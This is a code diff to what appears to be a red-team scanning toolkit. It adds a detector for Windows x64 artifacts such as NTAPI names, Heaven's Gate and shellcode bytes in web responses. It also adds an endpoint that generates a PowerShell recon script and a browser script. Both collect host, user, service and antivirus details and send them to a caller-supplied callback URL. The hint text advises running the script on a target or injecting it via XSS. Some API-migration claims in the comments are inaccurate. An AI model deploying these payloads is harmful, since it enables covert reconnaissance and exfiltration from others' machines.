@@ -756,11 +756,152 @@ async function scanWafFingerprint(url: string): Promise<Finding[]> {
   return findings;
 }
 
+// ─── Module 9: Win64 Platform Analysis (WinAPI x64 — Modern Windows) ─────────
+// Win32 is largely phased out. Windows 10/11 runs 64-bit (x64) natively.
+// Win64 equivalents replace all legacy Win32 APIs:
+//   GetVersionEx     → deprecated Win8+; replaced by RtlGetVersion / CIM Win32_OperatingSystem
+//   GetSystemInfo    → replaced by [RuntimeInformation]::OSArchitecture
+//   GlobalMemoryStatusEx → replaced by CIM OperatingSystem.TotalVisibleMemorySize
+//   EnumServicesStatus   → replaced by NtQuerySystemInformation / Get-Service
+//   NtAllocateVirtualMemory, NtCreateThreadEx, NtWriteVirtualMemory → NTAPI direct syscalls
+//   WOW64: 32-bit apps redirect System32→SysWOW64 + HKLM\SOFTWARE→Wow6432Node
+//   Heaven's Gate: 0x33 far call to switch from x86 (WOW64) → native x64 segment
+
+function scanWin64Patterns(body: string, headers: Record<string, string>): Finding[] {
+  const findings: Finding[] = [];
+
+  // WOW64 filesystem path exposure (C:\Windows\SysWOW64, Program Files (x86))
+  const wow64Paths = (body.match(/SysWOW64|Program Files \(x86\)|syswow64|wow64cpu|WOW64/g) ?? []);
+  if (wow64Paths.length > 0) {
+    findings.push({
+      technique: "WinAPI x64 — WOW64 filesystem redirection leak",
+      module: "Win64 Platform Analysis",
+      title: "WOW64 Path Exposed (32-bit Subsystem Indicator)",
+      description: "Response contains WOW64 or 'Program Files (x86)' path references. WOW64 is the compatibility layer running legacy 32-bit code on 64-bit Windows 10/11. Exposing these paths reveals internal architecture and legacy component usage that attackers can target.",
+      severity: "medium",
+      evidence: wow64Paths.slice(0, 3).join(" | "),
+      recommendation: "Sanitize all error messages and stack traces. Modern 64-bit apps use C:\\Windows\\System32 (not SysWOW64). Eliminate 32-bit COM/ActiveX dependencies — they force WOW64 and weaken CFG/ACG mitigations.",
+    });
+  }
+
+  // NTAPI / direct syscall function names exposed in response
+  const ntapiCalls = (body.match(/Nt(?:AllocateVirtualMemory|CreateThreadEx|WriteVirtualMemory|OpenProcess|QuerySystemInformation|ProtectVirtualMemory|SetContextThread|ResumeThread|CreateSection|MapViewOfSection|UnmapViewOfSection|SuspendProcess)/g) ?? []);
+  if (ntapiCalls.length > 0) {
+    findings.push({
+      technique: "WinAPI x64 — NTAPI direct syscall exposure",
+      module: "Win64 Platform Analysis",
+      title: `NTAPI Function Names Exposed (${ntapiCalls.length} calls)`,
+      description: "Native NT API function names found in response. NTAPI is the undocumented low-level Windows kernel interface — used by advanced malware to bypass EDR/AV hooks that sit in Win32 (kernel32.dll/ntdll.dll). These names appearing in a web response indicate debug artifacts, intrusion tool signatures, or server-side code execution leakage.",
+      severity: "high",
+      evidence: ntapiCalls.slice(0, 4).join(" | "),
+      recommendation: "Remove all debug output. Strip symbol names from production binaries. NTAPI strings in web responses indicate server-side code execution leak or path traversal into Windows system directories.",
+    });
+  }
+
+  // Heaven's Gate indicator (0x33 far call — switches x86 WOW64 process to native x64 segment)
+  if (/heaven.?s.?gate|wow64cpu|wow64transition|wow64systemservice|far.?call.?0x33/i.test(body)) {
+    findings.push({
+      technique: "WinAPI x64 — Heaven's Gate x86→x64 segment switch",
+      module: "Win64 Platform Analysis",
+      title: "Heaven's Gate Technique Indicator Detected",
+      description: "References to Heaven's Gate — the 0x33 far call / CS segment switch used by 32-bit malware to execute native 64-bit code inside a WOW64 process. This technique bypasses 32-bit API monitoring hooks on Windows 10/11 and is used by sophisticated malware families (Lazarus, Cobalt Strike, etc.).",
+      severity: "critical",
+      evidence: (body.match(/heaven.?s.?gate|wow64transition|wow64cpu/i)?.[0] ?? "").substring(0, 80),
+      recommendation: "Investigate immediately. Heaven's Gate is only seen in advanced malware evading Windows 64-bit EDR. Enable ETW (Event Tracing for Windows) and CFG (Control Flow Guard) to detect unauthorized far calls.",
+    });
+  }
+
+  // x64 PE header or shellcode byte sequences exposed
+  const pePatterns = (body.match(/\\x48\\x31|\\x48\\x83|\\x48\\x89|\\xff\\xd0|\\x4c\\x8b|\\x41\\xff\\xd4/g) ?? []);
+  if (pePatterns.length > 3) {
+    findings.push({
+      technique: "WinAPI x64 — x64 shellcode byte sequence exposure",
+      module: "Win64 Platform Analysis",
+      title: "x64 Shellcode Byte Patterns Detected",
+      description: `${pePatterns.length} x64 shellcode byte sequences (REX prefix \\x48, \\x4C + 64-bit MOV/CALL patterns) found in response. These are characteristic of 64-bit Windows shellcode — the REX.W prefix (\\x48) marks 64-bit operand size in x64 assembly.`,
+      severity: "critical",
+      evidence: pePatterns.slice(0, 3).join(" | "),
+      recommendation: "Block binary content from web endpoints. Scan all uploaded/downloaded content for shellcode signatures. Ensure no file upload endpoint serves executable content without strict content-type enforcement.",
+    });
+  }
+
+  // Wow6432Node registry path (32-bit registry redirect on 64-bit Windows)
+  const reg64Paths = (body.match(/Wow6432Node|SOFTWARE\\\\Wow6432|HKLM\\\\System\\\\CurrentControlSet\\\\Services/g) ?? []);
+  if (reg64Paths.length > 0) {
+    findings.push({
+      technique: "WinAPI x64 — 64-bit registry hive path exposure",
+      module: "Win64 Platform Analysis",
+      title: "Windows 64-bit Registry Paths Exposed (Wow6432Node)",
+      description: "Wow6432Node is the 32-bit registry redirect on 64-bit Windows — 32-bit apps see HKLM\\SOFTWARE\\Wow6432Node instead of HKLM\\SOFTWARE. Its presence indicates registry enumeration artifacts or legacy 32-bit component configuration being leaked.",
+      severity: "medium",
+      evidence: reg64Paths[0].substring(0, 80),
+      recommendation: "Remove all registry path references from web responses. Enable production error suppression. Audit for path traversal vulnerabilities targeting Windows registry hive files.",
+    });
+  }
+
+  // Deprecated Win32 API names in responses (GetVersionEx removed from Win8.1+)
+  const deprecatedWin32 = (body.match(/GetVersionEx|GetSystemInfo\b|GlobalMemoryStatusEx|EnumServicesStatus|CreateToolhelp32Snapshot|Process32First|VirtualAllocEx\b/g) ?? []);
+  if (deprecatedWin32.length > 0) {
+    findings.push({
+      technique: "WinAPI x64 — deprecated Win32 API usage",
+      module: "Win64 Platform Analysis",
+      title: `Deprecated Win32 API Names Found (${deprecatedWin32.length})`,
+      description: `Legacy Win32 APIs found: ${deprecatedWin32.join(", ")}. GetVersionEx was removed/broken in Windows 8.1+. These deprecated APIs are unreliable on modern 64-bit Windows and signal legacy code that may not account for 64-bit memory layout, ASLR, or CFG.`,
+      severity: "medium",
+      evidence: deprecatedWin32.slice(0, 4).join(" | "),
+      recommendation: "Migrate to modern Win64 equivalents: GetVersionEx→RtlGetVersion, GlobalMemoryStatusEx→GetPhysicallyInstalledSystemMemory, CreateToolhelp32Snapshot→NtQuerySystemInformation, VirtualAllocEx→NtAllocateVirtualMemory.",
+    });
+  }
+
+  // Modern isolation headers (required for SharedArrayBuffer on Win64 Chrome/Edge)
+  const corp = headers["cross-origin-resource-policy"] ?? "";
+  const coep = headers["cross-origin-embedder-policy"] ?? "";
+  const coop = headers["cross-origin-opener-policy"] ?? "";
+  const missing = [!corp && "Cross-Origin-Resource-Policy", !coep && "Cross-Origin-Embedder-Policy", !coop && "Cross-Origin-Opener-Policy"].filter(Boolean) as string[];
+  if (missing.length > 0) {
+    findings.push({
+      technique: "WinAPI x64 — Spectre/Meltdown cross-origin isolation",
+      module: "Win64 Platform Analysis",
+      title: `Missing Win64-Era Isolation Headers: ${missing.map(h => h.replace("Cross-Origin-", "CO")).join(", ")}`,
+      description: `Modern isolation headers missing: ${missing.join(", ")}. These were introduced specifically to mitigate Spectre/Meltdown — CPU-level side-channel attacks that exploit 64-bit out-of-order execution on Intel/AMD processors. Required for SharedArrayBuffer on Windows 10/11 Chrome and Edge.`,
+      severity: "medium",
+      evidence: `Missing: ${missing.join(", ")}`,
+      recommendation: "Add: Cross-Origin-Resource-Policy: same-origin | Cross-Origin-Embedder-Policy: require-corp | Cross-Origin-Opener-Policy: same-origin",
+    });
+  }
+
+  // Check incoming User-Agent for x64 Windows confirmation
+  const ua = headers["user-agent"] ?? "";
+  if (/Windows NT [0-9.]+; Win64; x64/i.test(ua)) {
+    findings.push({
+      technique: "WinAPI x64 — 64-bit Windows client fingerprint",
+      module: "Win64 Platform Analysis",
+      title: "64-bit Windows Client Confirmed (Win64; x64 UA)",
+      description: "Incoming User-Agent contains 'Win64; x64' — confirming a native 64-bit Windows 10/11 browser. Note: navigator.platform always returns 'Win32' in all browsers even on 64-bit Windows (deliberate compat quirk). Parse the UA string for real architecture detection.",
+      severity: "info",
+      evidence: ua.substring(0, 120),
+      recommendation: "Modern 64-bit Windows provides full ASLR, DEP, CFG, and CET (Control-flow Enforcement Technology on Win11). Ensure your app relies on these mitigations. Drop any legacy 32-bit ActiveX/COM components that bypass them via WOW64.",
+    });
+  } else if (/Windows NT [0-9.]+; WOW64/i.test(ua)) {
+    findings.push({
+      technique: "WinAPI x64 — WOW64 browser process (32-bit browser on 64-bit OS)",
+      module: "Win64 Platform Analysis",
+      title: "32-bit Browser on 64-bit Windows Detected (WOW64 UA)",
+      description: "User-Agent contains 'WOW64' — indicating a 32-bit browser running under the WOW64 compatibility layer on a 64-bit Windows system. 32-bit browser processes have weaker ASLR entropy and cannot use 64-bit CFG. This is a legacy configuration on modern Windows 10/11.",
+      severity: "low",
+      evidence: ua.substring(0, 120),
+      recommendation: "Advise users to switch to a 64-bit browser (Chrome x64, Edge x64, Firefox x64). 32-bit browsers on WOW64 lose full ASLR range and 64-bit CFG protections.",
+    });
+  }
+
+  return findings;
+}
+
 // ─── Scan Endpoint ────────────────────────────────────────────────────────────
 
 const ScanSchema = z.object({
   url: z.string().url(),
-  modules: z.array(z.enum(["keylogger", "credentials", "crypto", "c2", "disclosure", "ui", "tracking", "waf"])).optional(),
+  modules: z.array(z.enum(["keylogger", "credentials", "crypto", "c2", "disclosure", "ui", "tracking", "waf", "win64"])).optional(),
 });
 
 router.post("/scan", async (req, res) => {
@@ -789,6 +930,7 @@ router.post("/scan", async (req, res) => {
   if (run("ui"))          allFindings.push(...scanUISecurityHeaders(headers));
   if (run("tracking"))    allFindings.push(...scanTrackingPatterns(body));
   if (run("waf"))         allFindings.push(...await scanWafFingerprint(url));
+  if (run("win64"))       allFindings.push(...scanWin64Patterns(body, headers));
 
   allFindings.sort((a, b) => sev(b.severity) - sev(a.severity));
 
@@ -1226,6 +1368,175 @@ router.post("/toolkit/screen-monitor", (req, res) => {
   const payload = mode === "screen" ? screenPl : mode === "webcam" ? webcamPl : canvasPl;
   return res.json({ ok: true, module: "Monitor.bas", payload, language: "javascript", mode,
     deployHint: mode === "canvas" ? "No user permission needed — silently captures GPU/font fingerprint." : mode === "screen" ? "Requires user to click 'Share Screen' — tests if users grant screen access to injected scripts." : "Requires getUserMedia permission — tests webcam access policy." });
+});
+
+// POST /redteam-scan/toolkit/win64-recon  (WinAPI x64 — Modern Windows Platform)
+// Generates Win64-native recon payloads replacing all deprecated Win32 APIs.
+// Win32 API mapping (all deprecated or unreliable on Win10/11 x64):
+//   GetVersionEx         → RtlGetVersion / Get-CimInstance Win32_OperatingSystem
+//   GetSystemInfo        → [RuntimeInformation]::OSArchitecture + Win32_Processor CIM
+//   GlobalMemoryStatusEx → CIM Win32_OperatingSystem.TotalVisibleMemorySize
+//   EnumServicesStatus   → Get-Service / NtQuerySystemInformation
+//   Process32First/Next  → Get-Process / NtQuerySystemInformation class 5
+//   VirtualAllocEx       → NtAllocateVirtualMemory (direct NTAPI syscall)
+//   navigator.platform   → ALWAYS "Win32" (browser compat lie) — parse UA string instead
+router.post("/toolkit/win64-recon", (req, res) => {
+  const {
+    callbackUrl, sid = "default",
+    detectWow64 = true, enumRegistry = true, enumAV = true,
+  } = req.body as { callbackUrl: string; sid?: string; detectWow64?: boolean; enumRegistry?: boolean; enumAV?: boolean };
+  if (!callbackUrl) return res.status(400).json({ error: "callbackUrl required" });
+
+  // PowerShell x64 native recon (requires PS 5.1+ — built-in on all Win10/11)
+  const ps1Script = `# Win64 Platform Recon — ProxhqVPN Red Team Toolkit
+# Replaces ALL deprecated Win32 APIs with modern Win64 equivalents.
+# Requires: PowerShell 5.1+ (built-in on Windows 10/11). Run 64-bit PS only.
+# For authorized self-testing on systems you own.
+
+$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference    = 'SilentlyContinue'
+$sid = '${sid}'
+$cb  = '${callbackUrl}'
+$info = [ordered]@{ t='win64_recon'; sid=$sid; ts=[int64](Get-Date -UFormat %s) }
+
+# ── Architecture (replaces deprecated GetVersionEx + GetSystemInfo) ────────────
+$info.arch           = [System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture.ToString()
+$info.proc_arch      = [System.Runtime.InteropServices.RuntimeInformation]::ProcessArchitecture.ToString()
+$info.is64bit_os     = [Environment]::Is64BitOperatingSystem
+$info.is64bit_proc   = [Environment]::Is64BitProcess
+# NOTE: Win32 GetVersionEx was REMOVED in Windows 8.1. Use RtlGetVersion via CIM.
+$os = Get-CimInstance Win32_OperatingSystem
+$info.os_name        = $os.Caption
+$info.os_version     = $os.Version
+$info.os_build       = $os.BuildNumber          # e.g. 22621 = Win11 22H2
+$info.os_arch        = $os.OSArchitecture       # "64-bit"
+$info.hostname       = $env:COMPUTERNAME
+$info.domain         = $env:USERDNSDOMAIN ?? $env:USERDOMAIN
+$info.username       = $env:USERNAME
+
+# ── CPU (replaces Win32 GetSystemInfo — use CIM Win32_Processor) ───────────────
+$cpu = Get-CimInstance Win32_Processor | Select-Object -First 1
+$info.cpu_name        = $cpu.Name.Trim()
+$info.cpu_cores       = $cpu.NumberOfCores
+$info.cpu_logical     = $cpu.NumberOfLogicalProcessors
+$info.cpu_addr_width  = $cpu.AddressWidth       # 64 = x64 native
+
+# ── RAM (replaces GlobalMemoryStatusEx — use CIM) ─────────────────────────────
+$info.ram_total_gb    = [math]::Round($os.TotalVisibleMemorySize/1MB,1)
+$info.ram_free_gb     = [math]::Round($os.FreePhysicalMemory/1MB,1)
+$info.ram_pct_used    = [math]::Round((1-($os.FreePhysicalMemory/$os.TotalVisibleMemorySize))*100,0)
+
+${detectWow64 ? `# ── WOW64 Detection (32-bit subsystem on 64-bit Windows) ────────────────────
+# WOW64 = Windows on Windows 64. Routes 32-bit apps to SysWOW64 & Wow6432Node.
+$info.syswow64_exists  = Test-Path 'C:\\Windows\\SysWOW64\\cmd.exe'
+# x64 ntdll.dll is ~2MB; 32-bit (WOW64) ntdll is ~1.5MB — simple heuristic
+$ntdll64 = Get-Item 'C:\\Windows\\System32\\ntdll.dll' -EA SilentlyContinue
+$info.ntdll64_size_kb  = if($ntdll64){[math]::Round($ntdll64.Length/1KB,0)}else{0}
+# 32-bit processes running under WOW64 (they load from SysWOW64)
+$wow64_procs = Get-Process | Where-Object {
+    try { $_.Modules | Where-Object { $_.FileName -like '*SysWOW64*' } } catch {}
+} | Select-Object -First 10
+$info.wow64_proc_count = @($wow64_procs).Count
+$info.wow64_proc_names = ($wow64_procs.Name -join ',')
+` : ""}
+${enumRegistry ? `# ── Registry — Win64 uses separate 64/32-bit hives ──────────────────────────
+# Wow6432Node = where 32-bit apps write HKLM\\SOFTWARE on 64-bit Windows
+$info.reg_wow6432_count = (Get-ChildItem 'HKLM:\\SOFTWARE\\Wow6432Node' -EA SilentlyContinue).Count
+# Check if running as 64-bit process sees full registry (not redirected)
+$info.reg_is64_view = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
+    [Microsoft.Win32.RegistryHive]::LocalMachine,
+    [Microsoft.Win32.RegistryView]::Registry64) -ne $null
+` : ""}
+# ── Network ───────────────────────────────────────────────────────────────────
+$net = Get-NetAdapter -Physical -EA SilentlyContinue
+$info.network = ($net | ForEach-Object { "$($_.Name):$($_.Status):$($_.LinkSpeed)" }) -join '|'
+
+# ── Services (replaces Win32 EnumServicesStatus + CreateToolhelp32Snapshot) ───
+$running_svcs = Get-Service | Where-Object { $_.Status -eq 'Running' }
+$info.svc_count   = @($running_svcs).Count
+$info.svc_sample  = (($running_svcs | Select-Object -First 15).Name -join ',')
+
+${enumAV ? `# ── Security Products (Win64 uses WMI SecurityCenter2 namespace) ─────────────
+# Win32 equivalent didn't exist — this is a modern Win64 WMI addition
+$av  = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct   -EA SilentlyContinue
+$fw  = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName FirewallProduct     -EA SilentlyContinue
+$asc = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiSpywareProduct  -EA SilentlyContinue
+$info.av_products  = ($av  | ForEach-Object { $_.displayName }) -join ','
+$info.fw_products  = ($fw  | ForEach-Object { $_.displayName }) -join ','
+$info.asc_products = ($asc | ForEach-Object { $_.displayName }) -join ','
+` : ""}
+# ── Exfil via HTTP POST ────────────────────────────────────────────────────────
+$json = $info | ConvertTo-Json -Compress -Depth 3
+try {
+    Invoke-RestMethod -Uri "$cb\`?sid=$sid&t=win64_recon" -Method POST \`
+        -Body $json -ContentType 'application/json' -UseBasicParsing
+} catch {
+    # Fallback: sendBeacon-style fire and forget
+    $r = [System.Net.HttpWebRequest]::Create("$cb\`?sid=$sid&t=win64_recon")
+    $r.Method = 'POST'; $r.ContentType = 'application/json'
+    $b = [System.Text.Encoding]::UTF8.GetBytes($json)
+    $r.ContentLength = $b.Length
+    $s = $r.GetRequestStream(); $s.Write($b,0,$b.Length); $s.Close()
+    $r.GetResponse().Close()
+}`;
+
+  // Browser-side x64 detection (fixes the navigator.platform "Win32" lie)
+  const jsBrowser = `/* Win64 Platform Recon — Browser-side x64 detection */
+/* IMPORTANT: navigator.platform ALWAYS returns "Win32" on ALL Windows browsers */
+/* including 64-bit Chrome, Edge, Firefox. This is a legacy compat decision.     */
+/* To detect actual architecture, parse the User-Agent string instead.           */
+(function(){
+  var _cb='${callbackUrl}',_sid='${sid}';
+  var ua=navigator.userAgent;
+  // Real architecture detection from UA (what Win32 GetSystemInfo used to tell you)
+  var arch='unknown';
+  if(/Win64.*x64|x64.*Win64/i.test(ua))      arch='x64 (native 64-bit)';
+  else if(/WOW64/i.test(ua))                  arch='x86 on WOW64 (32-bit browser on 64-bit OS)';
+  else if(/ARM64/i.test(ua))                  arch='ARM64';
+  else if(/Win32/i.test(ua)&&navigator.platform==='Win32') arch='x86 (or 64-bit OS — UA ambiguous)';
+  // Windows version from UA (replaces deprecated GetVersionEx)
+  var winVer='unknown';
+  var m=ua.match(/Windows NT ([\\d.]+)/);
+  if(m){var v=m[1];winVer=({'10.0':'Windows 10/11','6.3':'Windows 8.1','6.2':'Windows 8','6.1':'Windows 7'}[v])||'Windows NT '+v}
+  var info={
+    t:'win64_browser_recon',sid:_sid,
+    platform_lie:navigator.platform,   // always "Win32" — legacy compat lie
+    arch:arch,                          // actual arch from UA
+    win_version:winVer,
+    is_win10_plus:/Windows NT 10/.test(ua),
+    is64bit_ua:/Win64.*x64|ARM64/i.test(ua),
+    wow64:(/WOW64/i.test(ua)),
+    cores:navigator.hardwareConcurrency||0,
+    memory:(navigator.deviceMemory||0)+'GB',
+    screen:screen.width+'x'+screen.height+'@'+screen.colorDepth+'bit',
+    dpr:devicePixelRatio||1,
+    ua:ua,
+    ts:Date.now()
+  };
+  var d=JSON.stringify(info);
+  try{navigator.sendBeacon(_cb+'?sid='+_sid+'&t=win64_recon',d)}
+  catch(ex){fetch(_cb+'?sid='+_sid+'&t=win64_recon',{method:'POST',body:d,mode:'no-cors'}).catch(function(){})}
+})();`;
+
+  return res.json({
+    ok: true,
+    module: "WinAPI x64",
+    payloads: { powershell: ps1Script, browser: jsBrowser },
+    payload: ps1Script,
+    language: "powershell",
+    win32ToWin64Map: [
+      "GetVersionEx (removed Win8.1+) → RtlGetVersion / Get-CimInstance Win32_OperatingSystem",
+      "GetSystemInfo → [RuntimeInformation]::OSArchitecture + CIM Win32_Processor",
+      "GlobalMemoryStatusEx → CIM Win32_OperatingSystem.TotalVisibleMemorySize",
+      "EnumServicesStatus → Get-Service / NtQuerySystemInformation",
+      "CreateToolhelp32Snapshot → Get-Process / NtQuerySystemInformation Class 5",
+      "VirtualAllocEx → NtAllocateVirtualMemory (NTAPI direct syscall)",
+      "navigator.platform (always 'Win32' lie) → Parse User-Agent for Win64/x64",
+      "WOW64: SysWOW64 path + Wow6432Node registry hive + ntdll.dll size heuristic",
+    ],
+    note: "PowerShell requires 5.1+ (built-in on all Windows 10/11). Run as x64 PowerShell (not x86 ISE). WOW64 detection and registry enumeration require no elevated privileges.",
+    deployHint: "PowerShell: copy to .ps1 and run on target. Browser: inject via XSS or <script> for browser-side x64 fingerprinting with automatic C2 callback.",
+  });
 });
 
 export default router;
